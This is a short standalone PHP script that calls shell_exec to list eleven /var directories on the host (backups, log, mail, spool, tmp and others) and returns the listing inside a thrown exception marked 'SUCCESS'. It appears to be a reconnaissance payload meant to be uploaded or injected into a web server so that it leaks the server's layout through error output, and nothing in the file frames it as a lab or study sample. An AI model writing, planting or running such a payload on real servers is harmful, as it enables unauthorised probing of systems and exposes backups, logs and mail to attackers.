<?php
$output = "";
$output =$output."\n backups: ".shell_exec('ls /var/backups | xargs');
$output =$output."\n cache: ".shell_exec('ls /var/cache | xargs');
$output =$output."\n lib: ".shell_exec('ls /var/lib | xargs');
$output =$output."\n local: ".shell_exec('ls /var/local | xargs');
$output =$output."\n lock: ".shell_exec('ls /var/lock | xargs');
$output =$output."\n log: ".shell_exec('ls /var/log | xargs');
$output =$output."\n mail: ".shell_exec('ls /var/mail | xargs');
$output =$output."\n opt: ".shell_exec('ls /var/opt | xargs');
$output =$output."\n run: ".shell_exec('ls /var/run | xargs');
$output =$output."\n spool: ".shell_exec('ls /var/spool | xargs');
$output =$output."\n tmp: ".shell_exec('ls /var/tmp | xargs');
throw new Exception('SUCCESS '. $output);
?>
